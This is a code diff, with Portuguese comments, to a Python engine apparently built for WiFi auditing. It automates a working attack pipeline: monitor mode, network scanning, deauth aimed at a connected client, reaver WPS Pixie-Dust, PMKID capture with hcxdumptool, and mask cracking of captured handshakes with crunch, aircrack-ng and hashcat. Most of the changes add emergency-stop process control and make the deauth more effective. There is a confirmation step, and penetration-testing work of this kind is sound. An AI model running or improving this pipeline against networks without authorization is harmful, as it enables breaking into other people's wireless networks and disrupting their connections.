@@ -15,6 +15,7 @@ import os
 import re
 import signal
 import subprocess
+import threading
 import time
 from datetime import datetime
 from pathlib import Path
@@ -71,6 +72,14 @@ class Engine:
         self.autorizado = False
         self._parar = False      # flag de parada de emergência (botão do painel)
         self._airodump_proc = None
+        # Registro de TODOS os subprocessos vivos (hashcat, aircrack, reaver,
+        # airodump, etc.). O botão de parada e o Ctrl+C no servidor matam esta
+        # lista inteira — sem isso, 'pedir_parada' só setava uma flag que um
+        # hashcat de 30 min nem olhava, e o Ctrl+C (os._exit) orfanava os
+        # filhos, que seguiam segurando a placa e queimando CPU.
+        self._procs = []
+        self._procs_lock = threading.Lock()
+        self._cleanup_feito = False
 
     # ------------------------------------------------------------------
     # util
@@ -86,35 +95,104 @@ class Engine:
         self.log_cb(linha)
 
     def pedir_parada(self):
-        """Chamado pelo endpoint /api/stop (botão de emergência no painel)."""
+        """Chamado pelo endpoint /api/stop (botão de emergência no painel).
+        Além de setar a flag, MATA de fato tudo que está rodando — senão um
+        hashcat/aircrack longo seguia até o fim ignorando o pedido de parada."""
         self._parar = True
+        self.matar_tudo()
 
     def _checar_parada(self):
         if self._parar:
             raise AttackAborted("Parada solicitada pelo usuário no painel.")
 
+    # ------------------------------------------------------------------
+    # controle de subprocessos (para a parada/Ctrl+C realmente matar tudo)
+    # ------------------------------------------------------------------
+
+    def _registrar(self, proc):
+        with self._procs_lock:
+            self._procs.append(proc)
+
+    def _desregistrar(self, proc):
+        with self._procs_lock:
+            if proc in self._procs:
+                self._procs.remove(proc)
+
+    def _matar_proc(self, proc):
+        """Mata um processo e todo o seu grupo (ele é criado com
+        start_new_session=True, então é líder do próprio grupo e matamos só a
+        subárvore dele — nunca o servidor Flask)."""
+        if proc is None or proc.poll() is not None:
+            return
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        except (ProcessLookupError, PermissionError, OSError):
+            try:
+                proc.terminate()
+            except OSError:
+                pass
+        for _ in range(5):
+            if proc.poll() is not None:
+                return
+            time.sleep(0.3)
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+        except (ProcessLookupError, PermissionError, OSError):
+            try:
+                proc.kill()
+            except OSError:
+                pass
+
+    def matar_tudo(self):
+        """Mata o airodump de captura (background) e todos os subprocessos
+        registrados. Usado pela parada de emergência e pela limpeza/Ctrl+C."""
+        self._matar_proc(self._airodump_proc)
+        with self._procs_lock:
+            procs = list(self._procs)
+        for p in procs:
+            self._matar_proc(p)
+
     def run(self, cmd, timeout=None, input_text=None):
-        """Roda um comando e loga a chamada + saída. Usa o timeout nativo do
-        subprocess, que já mata o processo (SIGKILL) se estourar — não sofre
-        do bug do `timeout` do bash sem --kill-after."""
+        """Roda um comando (em sessão/grupo próprio), loga a chamada + saída e
+        o registra para poder ser MORTO pela parada de emergência/Ctrl+C. Antes
+        usava subprocess.run, cujo processo nenhuma outra thread conseguia
+        matar — a parada só setava uma flag que o hashcat não observava."""
         self.log("$ " + " ".join(str(c) for c in cmd))
         try:
-            r = subprocess.run(
-                cmd, capture_output=True, text=True, timeout=timeout, input=input_text
+            proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE if input_text is not None else None,
+                text=True,
+                start_new_session=True,
             )
-        except subprocess.TimeoutExpired as e:
+        except FileNotFoundError as e:
+            self.log(f"(comando não encontrado: {e})")
+            return subprocess.CompletedProcess(cmd, 127, "", str(e))
+        self._registrar(proc)
+        rc = 0
+        try:
+            out, err = proc.communicate(input=input_text, timeout=timeout)
+            rc = proc.returncode
+        except subprocess.TimeoutExpired:
+            self._matar_proc(proc)
+            try:
+                out, err = proc.communicate(timeout=5)
+            except Exception:
+                out, err = "", ""
             self.log(f"(comando interrompido após {timeout}s)")
-            out = (e.stdout or "") if isinstance(e.stdout, str) else ""
-            err = (e.stderr or "") if isinstance(e.stderr, str) else ""
-            return subprocess.CompletedProcess(cmd, 124, out, err)
-        for stream in (r.stdout, r.stderr):
+            rc = 124
+        finally:
+            self._desregistrar(proc)
+        for stream in (out, err):
             if stream:
                 try:
                     with open(LOGFILE, "a") as f:
                         f.write(stream)
                 except OSError:
                     pass
-        return r
+        return subprocess.CompletedProcess(cmd, rc, out or "", err or "")
 
     # ------------------------------------------------------------------
     # 1. dependências / wordlist
@@ -182,7 +260,9 @@ class Engine:
 
     def entrar_modo_monitor(self, iface):
         self.iface = iface
+        self._cleanup_feito = False  # nova sessão de monitor → permite limpar de novo no fim
         self.log("Ajustando região regulatória para BR...")
+        self._avisar_driver_fraco(iface)
         self.run(["iw", "reg", "set", "BR"], timeout=10)
 
         self.log("Matando processos que podem interferir (NetworkManager, wpa_supplicant)...")
@@ -230,6 +310,22 @@ class Engine:
         self.log(f"Interface em modo monitor: {self.moniface}")
         return self.moniface
 
+    def _avisar_driver_fraco(self, iface):
+        """Avisa quando a placa usa driver Realtek rtw88/RTL88xx — modo monitor
+        e INJEÇÃO instáveis, o que derruba deauth/WPS/PMKID e faz o scan perder
+        redes ao trocar de canal. Melhor avisar que falhar sem explicação."""
+        try:
+            drv = os.path.basename(os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
+        except OSError:
+            return
+        if not drv or drv == "driver":
+            return
+        self.log(f"Driver da interface {iface}: {drv}")
+        if re.match(r"^(rtw88|rtw89|rtl8821|rtl8812|rtl8188|rtl8192|8821|8812|8188|8192)", drv):
+            self.log("AVISO: driver Realtek com monitor/INJEÇÃO instáveis — deauth/WPS/PMKID "
+                     "podem não injetar nada e o scan pode perder redes. A captura passiva de "
+                     "handshake ainda costuma funcionar.")
+
     def garantir_moniface_viva(self):
         r = subprocess.run(["iw", "dev", self.moniface, "info"], capture_output=True)
         if r.returncode != 0:
@@ -251,7 +347,10 @@ class Engine:
     # 3. scan e escolha do alvo
     # ------------------------------------------------------------------
 
-    def escanear(self, duracao=15):
+    def escanear(self, duracao=25):
+        # 25s (antes 15s): com --band abg o airodump salta ~38 canais; 15s não
+        # davam nem 2 varreduras e redes fracas (e o canal do alvo) escapavam —
+        # por isso a lista divergia do que aparecia depois travado num canal.
         self.garantir_moniface_viva()
         self.log(f"Escaneando redes nas bandas a/b/g por {duracao}s...")
 
@@ -279,6 +378,7 @@ class Engine:
         linhas = list(csv.reader(io.StringIO(secao_aps)))
 
         aps = []
+        vistos = set()
         for campos in linhas:
             if len(campos) < 14:
                 continue
@@ -288,7 +388,20 @@ class Engine:
             ch = campos[3].strip()
             privacidade = campos[5].strip()
             power = campos[8].strip() or "-100"
+            beacons = campos[9].strip()
             essid = campos[-2].strip() or "<oculto>"
+
+            # Descarta "fantasmas": linha de AP criada a partir de um BSSID visto
+            # só em frame de dados de um cliente (# beacons = 0, canal -1, sem
+            # ESSID/privacidade). Não são redes reais e poluíam a lista.
+            if beacons.isdigit() and int(beacons) == 0:
+                continue
+            if not (ch.lstrip("-").isdigit() and int(ch) > 0):
+                continue
+            if bssid in vistos:  # de-duplica por BSSID
+                continue
+            vistos.add(bssid)
+
             aps.append({
                 "bssid": bssid, "ch": ch, "enc": privacidade,
                 "pwr": int(power) if power.lstrip("-").isdigit() else -100,
@@ -297,7 +410,7 @@ class Engine:
 
         aps.sort(key=lambda a: a["pwr"], reverse=True)
         self.alvos = aps
-        self.log(f"{len(aps)} redes encontradas.")
+        self.log(f"{len(aps)} redes reais encontradas (fantasmas sem beacon descartados).")
         return aps
 
     def escolher_alvo(self, idx):
@@ -312,7 +425,24 @@ class Engine:
             f"Alvo escolhido: ESSID={self.target['essid']} BSSID={self.target['bssid']} "
             f"CH={self.target['ch']} ENC={self.target['enc']} ({freq_label})"
         )
+        self._avisar_limitacoes_cripto()
         return self.target
+
+    def _avisar_limitacoes_cripto(self):
+        """Alerta quando o alvo é WPA3/SAE: deauth é protegido por PMF/802.11w
+        (o cliente ignora) e o handshake SAE NÃO quebra por dicionário/máscara
+        como o 4-way do WPA2. As rotas A/C/D só têm chance pelo lado WPA2 de uma
+        rede em modo transição (WPA3 WPA2)."""
+        enc = (self.target.get("enc") or "").upper()
+        if "WPA3" in enc or "SAE" in enc:
+            self.log(f"AVISO: alvo usa WPA3/SAE ({self.target.get('enc')}). Deauth é ignorado "
+                     "sob PMF/802.11w e o handshake SAE não quebra por dicionário/máscara.")
+            if "WPA2" in enc:
+                self.log("Rede em modo transição (WPA3 WPA2): ainda há chance SE um cliente "
+                         "conectar pelo lado WPA2 — aí o 4-way fica atacável.")
+            else:
+                self.log("Rede WPA3 puro: dicionário/máscara/PMKID não se aplicam; "
+                         "provavelmente não vão encontrar a senha.")
 
     def autorizar(self, confirmado):
         self.autorizado = bool(confirmado)
@@ -335,6 +465,25 @@ class Engine:
             return False
         secao = texto.split("Station MAC", 1)[1]
         return self.target.get("bssid", "").lower() in secao.lower()
+
+    def cliente_do_alvo(self):
+        """Retorna o MAC do primeiro cliente associado ao BSSID alvo (ou None).
+        Deauth DIRECIONADO a esse MAC é bem mais eficaz que o broadcast."""
+        csv_path = Path(f"{CAPTURE_PREFIX}-01.csv")
+        if not csv_path.exists():
+            return None
+        texto = csv_path.read_text(errors="replace")
+        if "Station MAC" not in texto:
+            return None
+        secao = texto.split("Station MAC", 1)[1]
+        alvo = self.target.get("bssid", "").lower()
+        for linha in secao.splitlines():
+            campos = [c.strip() for c in linha.split(",")]
+            # Station MAC, First, Last, Power, # packets, BSSID, Probed ESSIDs
+            if len(campos) >= 6 and campos[5].lower() == alvo:
+                if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", campos[0]):
+                    return campos[0]
+        return None
 
     def _ultimo_cap(self):
         caps = sorted(WORKDIR.glob(f"{CAPTURE_PREFIX.name}*.cap"), key=os.path.getmtime, reverse=True)
@@ -362,6 +511,7 @@ class Engine:
             ["airodump-ng", "--bssid", self.target["bssid"], "-c", str(self.target["ch"]),
              "--write", str(CAPTURE_PREFIX), self.moniface],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            start_new_session=True,  # grupo próprio: dá pra matar via killpg na parada
         )
         self._airodump_proc = proc
 
@@ -376,8 +526,14 @@ class Engine:
                     break
 
                 if self.ha_cliente_conectado():
-                    self.log(f"Tentativa {tentativa}: cliente conectado detectado — enviando deauth...")
-                    self.run(["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"], self.moniface])
+                    cliente = self.cliente_do_alvo()
+                    if cliente:
+                        self.log(f"Tentativa {tentativa}: cliente {cliente} detectado — deauth DIRECIONADO...")
+                        self.run(["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"],
+                                  "-c", cliente, self.moniface])
+                    else:
+                        self.log(f"Tentativa {tentativa}: cliente conectado (sem MAC específico) — deauth broadcast...")
+                        self.run(["aireplay-ng", "--deauth", "5", "-a", self.target["bssid"], self.moniface])
                 else:
                     self.log(f"Tentativa {tentativa}: nenhum cliente conectado detectado ainda — aguardando conexão...")
         finally:
@@ -435,16 +591,22 @@ class Engine:
         self.log(f"Rodando crunch + aircrack-ng com máscara '{mascara}'...")
         crunch = subprocess.Popen(
             ["crunch", str(tamanho), str(tamanho), "-t", mascara],
-            stdout=subprocess.PIPE,
+            stdout=subprocess.PIPE, start_new_session=True,
         )
-        aircrack = subprocess.run(
+        self._registrar(crunch)
+        aircrack = subprocess.Popen(
             ["aircrack-ng", "-w", "-", "-b", self.target["bssid"], str(cap)],
-            stdin=crunch.stdout, capture_output=True, text=True,
+            stdin=crunch.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+            text=True, start_new_session=True,
         )
+        self._registrar(aircrack)
         crunch.stdout.close()
+        out_air, _ = aircrack.communicate()
         crunch.wait()
+        self._desregistrar(aircrack)
+        self._desregistrar(crunch)
 
-        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", aircrack.stdout)
+        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out_air or "")
         if m:
             self.senha = m.group(1)
             self.rota_usada = "Máscara (crunch)"
@@ -526,7 +688,9 @@ class Engine:
             ["timeout", "90", "reaver", "-i", self.moniface, "-b", self.target["bssid"],
              "-c", str(self.target["ch"]), "-K", "1", "-vv"],
             stdout=open(log_path, "w"), stderr=subprocess.STDOUT,
+            start_new_session=True,
         )
+        self._registrar(proc)
         chegou_m1 = False
         inicio = time.time()
         while proc.poll() is None:
@@ -542,6 +706,7 @@ class Engine:
                 proc.terminate()
                 break
         self._encerrar_processo(proc)
+        self._desregistrar(proc)
 
         texto = log_path.read_text(errors="replace")
         m = re.search(r"WPA PSK:\s*'?([^'\n]*)'?", texto)
@@ -615,12 +780,21 @@ class Engine:
                     base += ["--force"]
                 base += ["--potfile-disable", "-o", str(found)]
                 crunch = subprocess.Popen(
-                    ["crunch", str(tam), str(tam), "-t", m], stdout=subprocess.PIPE
+                    ["crunch", str(tam), str(tam), "-t", m],
+                    stdout=subprocess.PIPE, start_new_session=True,
                 )
-                r = subprocess.run(base, stdin=crunch.stdout, capture_output=True, text=True)
+                self._registrar(crunch)
+                hc = subprocess.Popen(
+                    base, stdin=crunch.stdout, stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE, text=True, start_new_session=True,
+                )
+                self._registrar(hc)
                 crunch.stdout.close()
+                out, err = hc.communicate()
                 crunch.wait()
-                return r
+                self._desregistrar(hc)
+                self._desregistrar(crunch)
+                return subprocess.CompletedProcess(base, hc.returncode, out or "", err or "")
 
             r = _rodar_crunch(False)
             saida = (r.stdout or "") + (r.stderr or "")
@@ -683,13 +857,13 @@ class Engine:
             freq_mhz = 2407 + ch_int * 5
         self.log(f"Tentando capturar PMKID direto do roteador por 30s (canal {self.target['ch']}, {freq_mhz} MHz)...")
         try:
-            subprocess.run(
+            # self.run roda em grupo próprio e é matável pela parada; o rc 124
+            # (timeout de 30s) é o fim ESPERADO aqui — ele captura até estourar.
+            self.run(
                 ["hcxdumptool", "-i", self.iface, "-w", str(pmkid_cap),
                  f"--bpf={bpf_file}", "-c", str(freq_mhz)],
-                timeout=30, capture_output=True,
+                timeout=30,
             )
-        except subprocess.TimeoutExpired:
-            pass
         finally:
             # Sempre volta pro modo monitor via airmon-ng, mesmo se a rota
             # falhar — as próximas rotas (dicionário) dependem disso.
@@ -915,7 +1089,18 @@ class Engine:
         }
 
     def cleanup(self):
+        # Idempotente dentro de um mesmo encerramento: o Ctrl+C no servidor
+        # dispara o handler de sinal E o atexit, chamando cleanup duas vezes
+        # (dois restarts de NetworkManager seguidos). A flag é zerada ao iniciar
+        # um novo modo monitor, então uma 2ª auditoria na mesma sessão limpa de novo.
+        if self._cleanup_feito:
+            return
+        self._cleanup_feito = True
         self.log("Executando limpeza / restauração da interface...")
+        try:
+            self.matar_tudo()  # mata airodump/hashcat/reaver/etc. antes de mexer na placa
+        except Exception as e:
+            self.log(f"Aviso ao matar processos: {e}")
         try:
             self.restaurar_modo_gerenciado()
         except Exception as e:  # nunca deixar a limpeza travar o programa
